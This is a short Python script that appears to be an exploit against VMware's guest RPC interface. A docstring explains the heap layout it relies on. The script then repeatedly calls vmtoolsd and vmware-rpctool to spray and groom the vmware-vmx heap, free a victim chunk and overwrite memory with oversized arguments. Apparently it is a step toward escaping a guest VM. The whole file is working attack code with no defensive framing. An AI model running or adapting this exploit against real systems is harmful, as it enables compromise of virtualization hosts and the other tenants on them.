import os, sys, time

"""
this works because the guestrpc is handled by each individual cpu thread,
but the VMCI packets are all handled through IO ports which are subject
to a lock in the vmware-vmx main thread, and all occur on that thread.

so what we can do is cause some initial allocations to happen on a random
cpu core's heap, and then have the actual data itself be allocated on the 
main [heap]
"""

# do an initial info-get to free stuff
os.system("vmtoolsd --cmd 'info-get guestinfo.blah.koadskfopaopsdkfopasokdpf ' >/dev/null")

# initial spray to make a bunch of 0x50 size chunks
for x in xrange(0x200):
    os.system("vmtoolsd --cmd 'info-set guestinfo.blah.sprad%04x %s' >/dev/null" % (x, "x"*0x40))

# initial spray to level out the heap
for x in xrange(0x60):
    os.system("vmtoolsd --cmd 'vmx.capability.unified_loop FUCKFUCKFUCK%04x%s' > /dev/null" % (x, "B"*0x7F0))

# create a chunk in thread heap
os.system("vmware-rpctool 'info-set guestinfo.blah.spray0000 %s' >/dev/null" % ("x"*0x5))
os.system("vmware-rpctool 'info-set guestinfo.blah.spray0001 %s' >/dev/null" % ("y"*0x1C70))
os.system("vmware-rpctool 'info-set guestinfo.blah.spray0002 %s' >/dev/null" % ("z"*0x1890))

# get it onto main heap to spray one victim we can free at will
os.system("vmtoolsd --cmd 'info-get guestinfo.blah.spray0001' >/dev/null")

# strategically prevent coalesce
for x in xrange(0x5):
    os.system("vmtoolsd --cmd 'vmx.capability.unified_loop coalesceprev%04x%s' > /dev/null" % (x, "B"*0x7F0))

for x in xrange(0x50):
    os.system("vmtoolsd --cmd 'vmx.capability.unified_loop aaaaaaaaaaaa%04x%s' > /dev/null" % (x, "B"*0x3c0))

for x in xrange(0x100):
    os.system("vmtoolsd --cmd 'vmx.capability.unified_loop bbbbbbbbbbbb%04x%s' > /dev/null" % (x, "B"*0x100))

# make some size 0x50 chunks now
for x in xrange(0x200):
    os.system("vmware-rpctool 'info-set guestinfo.blah.sprad%04x lol' >/dev/null" % (x))

# free the guest chunk we copied into the main heap arena
time.sleep(10)
os.system("vmtoolsd --cmd 'info-get guestinfo.blah.spray0002'")
os.system("vmtoolsd --cmd 'guest.upgrader_send_cmd_line_args %s' >/dev/null" % ("P"*0x3d0))
os.system("vmtoolsd --cmd 'tools.capability.guest_conf_directory %s' > /dev/null" % ("Q"*0x1100))
os.system("vmware-rpctool 'info-get guestinfo.none-existent' 2>/dev/null")
